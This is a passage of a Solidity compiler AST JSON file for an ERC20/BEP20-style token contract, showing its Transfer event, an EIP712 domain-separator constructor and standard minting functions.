													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 45,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "881:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 48,
												"indexed": false,
												"name": "value",
												"nodeType": "VariableDeclaration",
												"scope": 50,
												"src": "914:13:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 47,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "914:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "840:93:0"
									},
									"src": "826:108:0"
								},
								{
									"anonymous": false,
									"documentation": null,
									"id": 58,
									"name": "Transfer",
									"nodeType": "EventDefinition",
									"parameters": {
										"id": 57,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 52,
												"indexed": true,
												"name": "from",
												"nodeType": "VariableDeclaration",
												"scope": 58,
												"src": "954:20:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 51,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "954:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 54,
												"indexed": true,
												"name": "to",
												"nodeType": "VariableDeclaration",
												"scope": 58,
												"src": "976:18:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 53,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "976:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 56,
												"indexed": false,
												"name": "value",
												"nodeType": "VariableDeclaration",
												"scope": 58,
												"src": "996:13:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 55,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "996:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "953:57:0"
									},
									"src": "939:72:0"
								},
								{
									"body": {
										"id": 90,
										"nodeType": "Block",
										"src": "1038:464:0",
										"statements": [
											{
												"assignments": [
													62
												],
												"declarations": [
													{
														"constant": false,
														"id": 62,
														"name": "chainId",
														"nodeType": "VariableDeclaration",
														"scope": 90,
														"src": "1048:15:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 61,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "1048:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 63,
												"initialValue": null,
												"nodeType": "VariableDeclarationStatement",
												"src": "1048:15:0"
											},
											{
												"externalReferences": [
													{
														"chainId": {
															"declaration": 62,
															"isOffset": false,
															"isSlot": false,
															"src": "1096:7:0",
															"valueSize": 1
														}
													}
												],
												"id": 64,
												"nodeType": "InlineAssembly",
												"operations": "{ chainId := chainid() }",
												"src": "1073:51:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 88,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 65,
														"name": "DOMAIN_SEPARATOR",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 35,
														"src": "1133:16:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bytes32",
															"typeString": "bytes32"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"arguments": [
																			{
																				"argumentTypes": null,
																				"hexValue": "454950373132446f6d61696e28737472696e67206e616d652c737472696e672076657273696f6e2c75696e7432353620636861696e49642c6164647265737320766572696679696e67436f6e747261637429",
																				"id": 70,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "string",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "1234:84:0",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_stringliteral_8b73c3c69bb8fe3d512ecc4cf759cc79239f7b179b0ffacaa9a75d522b39400f",
																					"typeString": "literal_string \"EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)\""
																				},
																				"value": "EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"
																			}
																		],
																		"expression": {
																			"argumentTypes": [
																				{
																					"typeIdentifier": "t_stringliteral_8b73c3c69bb8fe3d512ecc4cf759cc79239f7b179b0ffacaa9a75d522b39400f",
																					"typeString": "literal_string \"EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)\""
																				}
																			],
																			"id": 69,
																			"name": "keccak256",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 2350,
																			"src": "1203:9:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_function_keccak256_pure$_t_bytes_memory_ptr_$returns$_t_bytes32_$",
																				"typeString": "function (bytes memory) pure returns (bytes32)"
																			}
																		},
																		"id": 71,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "functionCall",
																		"lValueRequested": false,
																		"names": [],
																		"nodeType": "FunctionCall",
																		"src": "1203:133:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bytes32",
																			"typeString": "bytes32"
																		}
																	},
																	{
																		"argumentTypes": null,
																		"arguments": [
																			{
																				"argumentTypes": null,
																				"arguments": [
																					{
																						"argumentTypes": null,
																						"id": 74,
																						"name": "name",
																						"nodeType": "Identifier",
																						"overloadedDeclarations": [],
																						"referencedDeclaration": 11,
																						"src": "1370:4:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_string_memory",
																							"typeString": "string memory"
																						}
																					}
																				],
																				"expression": {
																					"argumentTypes": [
																						{
																							"typeIdentifier": "t_string_memory",
																							"typeString": "string memory"
																						}
																					],
																					"id": 73,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"lValueRequested": false,
																					"nodeType": "ElementaryTypeNameExpression",
																					"src": "1364:5:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_type$_t_bytes_storage_ptr_$",
																						"typeString": "type(bytes storage pointer)"
																					},
																					"typeName": "bytes"
																				},
																				"id": 75,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "typeConversion",
																				"lValueRequested": false,
																				"names": [],
																				"nodeType": "FunctionCall",
																				"src": "1364:11:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bytes_memory_ptr",
																					"typeString": "bytes memory"
																				}
																			}
																		],
																		"expression": {
																			"argumentTypes": [
																				{
																					"typeIdentifier": "t_bytes_memory_ptr",
																					"typeString": "bytes memory"
																				}
																			],
																			"id": 72,
																			"name": "keccak256",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 2350,
																			"src": "1354:9:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_function_keccak256_pure$_t_bytes_memory_ptr_$returns$_t_bytes32_$",
																				"typeString": "function (bytes memory) pure returns (bytes32)"
																			}
																		},
																		"id": 76,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "functionCall",
																		"lValueRequested": false,
																		"names": [],
																		"nodeType": "FunctionCall",
																		"src": "1354:22:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bytes32",
																			"typeString": "bytes32"
																		}
																	},
																	{
																		"argumentTypes": null,
																		"arguments": [
																			{
																				"argumentTypes": null,
																				"arguments": [
																					{
																						"argumentTypes": null,
																						"hexValue": "31",
																						"id": 79,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": true,
																						"kind": "string",
																						"lValueRequested": false,
																						"nodeType": "Literal",
																						"src": "1410:3:0",
																						"subdenomination": null,
																						"typeDescriptions": {
																							"typeIdentifier": "t_stringliteral_c89efdaa54c0f20c7adf612882df0950f5a951637e0307cdcb4c672f298b8bc6",
																							"typeString": "literal_string \"1\""
																						},
																						"value": "1"
																					}
																				],
																				"expression": {
																					"argumentTypes": [
																						{
																							"typeIdentifier": "t_stringliteral_c89efdaa54c0f20c7adf612882df0950f5a951637e0307cdcb4c672f298b8bc6",
																							"typeString": "literal_string \"1\""
																						}
																					],
																					"id": 78,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"lValueRequested": false,
																					"nodeType": "ElementaryTypeNameExpression",
																					"src": "1404:5:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_type$_t_bytes_storage_ptr_$",
																						"typeString": "type(bytes storage pointer)"
																					},
																					"typeName": "bytes"
																				},
																				"id": 80,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "typeConversion",
																				"lValueRequested": false,
																				"names": [],
																				"nodeType": "FunctionCall",
																				"src": "1404:10:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_bytes_memory_ptr",
																					"typeString": "bytes memory"
																				}
																			}
																		],
																		"expression": {
																			"argumentTypes": [
																				{
																					"typeIdentifier": "t_bytes_memory_ptr",
																					"typeString": "bytes memory"
																				}
																			],
																			"id": 77,
																			"name": "keccak256",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 2350,
																			"src": "1394:9:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_function_keccak256_pure$_t_bytes_memory_ptr_$returns$_t_bytes32_$",
																				"typeString": "function (bytes memory) pure returns (bytes32)"
																			}
																		},
																		"id": 81,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "functionCall",
																		"lValueRequested": false,
																		"names": [],
																		"nodeType": "FunctionCall",
																		"src": "1394:21:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bytes32",
																			"typeString": "bytes32"
																		}
																	},
																	{
																		"argumentTypes": null,
																		"id": 82,
																		"name": "chainId",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 62,
																		"src": "1433:7:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	{
																		"argumentTypes": null,
																		"arguments": [
																			{
																				"argumentTypes": null,
																				"id": 84,
																				"name": "this",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 2374,
																				"src": "1466:4:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_contract$_ERC20_$435",
																					"typeString": "contract ERC20"
																				}
																			}
																		],
																		"expression": {
																			"argumentTypes": [
																				{
																					"typeIdentifier": "t_contract$_ERC20_$435",
																					"typeString": "contract ERC20"
																				}
																			],
																			"id": 83,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"lValueRequested": false,
																			"nodeType": "ElementaryTypeNameExpression",
																			"src": "1458:7:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_type$_t_address_$",
																				"typeString": "type(address)"
																			},
																			"typeName": "address"
																		},
																		"id": 85,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"kind": "typeConversion",
																		"lValueRequested": false,
																		"names": [],
																		"nodeType": "FunctionCall",
																		"src": "1458:13:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_bytes32",
																			"typeString": "bytes32"
																		},
																		{
																			"typeIdentifier": "t_bytes32",
																			"typeString": "bytes32"
																		},
																		{
																			"typeIdentifier": "t_bytes32",
																			"typeString": "bytes32"
																		},
																		{
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		},
																		{
																			"typeIdentifier": "t_address",
																			"typeString": "address"
																		}
																	],
																	"expression": {
																		"argumentTypes": null,
																		"id": 67,
																		"name": "abi",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 2343,
																		"src": "1175:3:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_magic_abi",
																			"typeString": "abi"
																		}
																	},
																	"id": 68,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"lValueRequested": false,
																	"memberName": "encode",
																	"nodeType": "MemberAccess",
																	"referencedDeclaration": null,
																	"src": "1175:10:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_abiencode_pure$__$returns$_t_bytes_memory_ptr_$",
																		"typeString": "function () pure returns (bytes memory)"
																	}
																},
																"id": 86,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "1175:310:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_bytes_memory_ptr",
																	"typeString": "bytes memory"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_bytes_memory_ptr",
																	"typeString": "bytes memory"
																}
															],
															"id": 66,
															"name": "keccak256",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 2350,
															"src": "1152:9:0",
															"typeDescriptions": {
																"typeIdentifier": "t_function_keccak256_pure$_t_bytes_memory_ptr_$returns$_t_bytes32_$",
																"typeString": "function (bytes memory) pure returns (bytes32)"
															}
														},
														"id": 87,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "functionCall",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "1152:343:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bytes32",
															"typeString": "bytes32"
														}
													},
													"src": "1133:362:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bytes32",
														"typeString": "bytes32"
													}
												},
												"id": 89,
												"nodeType": "ExpressionStatement",
												"src": "1133:362:0"
											}
										]
									},
									"documentation": null,
									"id": 91,
									"implemented": true,
									"kind": "constructor",
									"modifiers": [],
									"name": "",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 59,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1028:2:0"
									},
									"returnParameters": {
										"id": 60,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1038:0:0"
									},
									"scope": 435,
									"src": "1017:485:0",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "public"
								},
								{
									"body": {
										"id": 124,
										"nodeType": "Block",
										"src": "1559:149:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"id": 103,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 98,
														"name": "totalSupply",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 19,
														"src": "1569:11:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"id": 101,
																"name": "value",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 95,
																"src": "1599:5:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															],
															"expression": {
																"argumentTypes": null,
																"id": 99,
																"name": "totalSupply",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 19,
																"src": "1583:11:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 100,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "add",
															"nodeType": "MemberAccess",
															"referencedDeclaration": 2248,
															"src": "1583:15:0",
															"typeDescriptions": {
																"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																"typeString": "function (uint256,uint256) pure returns (uint256)"
															}
														},
														"id": 102,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "functionCall",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "1583:22:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "1569:36:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 104,
												"nodeType": "ExpressionStatement",
												"src": "1569:36:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 114,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"baseExpression": {
															"argumentTypes": null,
															"id": 105,
															"name": "balanceOf",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 23,
															"src": "1615:9:0",
															"typeDescriptions": {
																"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																"typeString": "mapping(address => uint256)"
															}
														},
														"id": 107,
														"indexExpression": {
															"argumentTypes": null,
															"id": 106,
															"name": "to",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 93,
															"src": "1625:2:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": true,
														"nodeType": "IndexAccess",
														"src": "1615:13:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"id": 112,
																"name": "value",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 95,
																"src": "1649:5:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															],
															"expression": {
																"argumentTypes": null,
																"baseExpression": {
																	"argumentTypes": null,
																	"id": 108,
																	"name": "balanceOf",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 23,
																	"src": "1631:9:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																		"typeString": "mapping(address => uint256)"
																	}
																},
																"id": 110,
																"indexExpression": {
																	"argumentTypes": null,
																	"id": 109,
																	"name": "to",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 93,
																	"src": "1641:2:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																},
																"isConstant": false,
																"isLValue": true,
																"isPure": false,
																"lValueRequested": false,
																"nodeType": "IndexAccess",
																"src": "1631:13:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 111,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "add",
															"nodeType": "MemberAccess",
															"referencedDeclaration": 2248,
															"src": "1631:17:0",
															"typeDescriptions": {
																"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																"typeString": "function (uint256,uint256) pure returns (uint256)"
															}
														},
														"id": 113,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "functionCall",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "1631:24:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "1615:40:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 115,
												"nodeType": "ExpressionStatement",
												"src": "1615:40:0"
											},
											{
												"eventCall": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"hexValue": "30",
																	"id": 118,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "1687:1:0",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	},
																	"value": "0"
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	}
																],
																"id": 117,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"lValueRequested": false,
																"nodeType": "ElementaryTypeNameExpression",
																"src": "1679:7:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_type$_t_address_$",
																	"typeString": "type(address)"
																},
																"typeName": "address"
															},
															"id": 119,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "1679:10:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														{
															"argumentTypes": null,
															"id": 120,
															"name": "to",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 93,
															"src": "1691:2:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"id": 121,
															"name": "value",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 95,
															"src": "1695:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 116,
														"name": "Transfer",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															58
														],
														"referencedDeclaration": 58,
														"src": "1670:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_event_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
															"typeString": "function (address,address,uint256)"
														}
													},
													"id": 122,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "1670:31:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 123,
												"nodeType": "EmitStatement",
												"src": "1665:36:0"
											}
										]
									},
									"documentation": null,
									"id": 125,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "_mint",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 96,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 93,
												"name": "to",
												"nodeType": "VariableDeclaration",
												"scope": 125,
												"src": "1523:10:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 92,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "1523:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 95,
												"name": "value",
												"nodeType": "VariableDeclaration",
												"scope": 125,
												"src": "1535:13:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 94,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "1535:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "1522:27:0"
									},
									"returnParameters": {
										"id": 97,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "1559:0:0"
									},
									"scope": 435,
									"src": "1508:200:0",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 171,
										"nodeType": "Block",
										"src": "1813:377:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															"id": 139,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 135,
																"name": "account",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 127,
																"src": "1869:7:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "!=",
															"rightExpression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"hexValue": "30",
																		"id": 137,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "1888:1:0",
																		"subdenomination": null,
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_0_by_1",
																			"typeString": "int_const 0"
																		},
																		"value": "0"
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_rational_0_by_1",
																			"typeString": "int_const 0"
																		}
																	],
																	"id": 136,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"lValueRequested": false,
																	"nodeType": "ElementaryTypeNameExpression",
																	"src": "1880:7:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_address_$",
																		"typeString": "type(address)"
																	},
																	"typeName": "address"
																},
																"id": 138,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "typeConversion",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "1880:10:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_address_payable",
																	"typeString": "address payable"
																}
															},
															"src": "1869:21:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "42455032303a206d696e7420746f20746865207a65726f2061646472657373",
															"id": 140,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "1892:33:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_9865f573770ea57d1686e7914cb6526cbb139a36ffdd4bab8d4db350bbc932b3",
																"typeString": "literal_string \"BEP20: mint to the zero address\""
															},
															"value": "BEP20: mint to the zero address"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_9865f573770ea57d1686e7914cb6526cbb139a36ffdd4bab8d4db350bbc932b3",
																"typeString": "literal_string \"BEP20: mint to the zero address\""
															}
														],
														"id": 134,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															2359,
															2360
														],
														"referencedDeclaration": 2360,
														"src": "1861:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 141,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "1861:65:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 142,
												"nodeType": "ExpressionStatement",
												"src": "1861:65:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 148,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 143,
														"name": "totalSupply",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 19,
														"src": "2002:11:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"id": 146,
																"name": "amount",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 129,
																"src": "2032:6:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															],
															"expression": {
																"argumentTypes": null,
																"id": 144,
																"name": "totalSupply",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
